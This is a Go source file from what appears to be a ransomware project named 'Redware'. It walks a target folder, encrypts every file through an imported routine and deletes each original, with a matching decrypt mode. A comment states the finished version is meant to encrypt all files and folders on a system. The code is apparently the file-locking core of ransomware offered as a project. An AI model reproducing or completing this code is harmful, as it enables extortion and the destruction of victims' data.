package foldercrypt

import (
	"io/fs"
	"os"
	"regexp"

	"github.com/Redhead92/Redware/Block1_Crypt/redcrypt"
	"github.com/Redhead92/Redware/Block1_Crypt/reddecrypt"
)

func check (e error){
	if e != nil{
		panic(e)
	}
}

func Foldercrypt(mode string, iFolder string, key string){
// WIP final code, encrypt all files and folders.

// test code, encrypt only indicated folders

switch mode{
// Decryption 
case "D":
	// Folder vars
	var temppath string
	folder := os.DirFS(iFolder)
	// walking system functions
	fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
		check(err)
		temppath = iFolder + path
		fileinfo, err := os.Stat(temppath)
		check(err)

		// skip dirs
		if fileinfo.IsDir(){
			
		}else{
			//Decrypt file into plaintext
			reddecrypt.Reddecrypt(temppath,key)
			// Delete files permanently 
				os.Remove(temppath)
				check(err)
			}
		return nil
	})

case "E":
	// Folder vars
	var temppath string
	folder := os.DirFS(iFolder)
	// walking system functions
	fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
		check(err)
		temppath = iFolder + path
		fileinfo, err := os.Stat(temppath)
		check(err)
		// skip dirs
		if fileinfo.IsDir() {
			
		}else{
			// Find folder Walk is currently in with path
				td := regexp.MustCompile(`((.*)\/)`)
				tempdir := string(td.FindString(temppath))
			// Read, Encrypt + generate new encrypted file with RedCrypt function
				redcrypt.Redcrypt(tempdir, key,temppath) 
			// Delete files permanently 
				os.Remove(temppath)
				check(err)
			}
		return nil
	})

}
}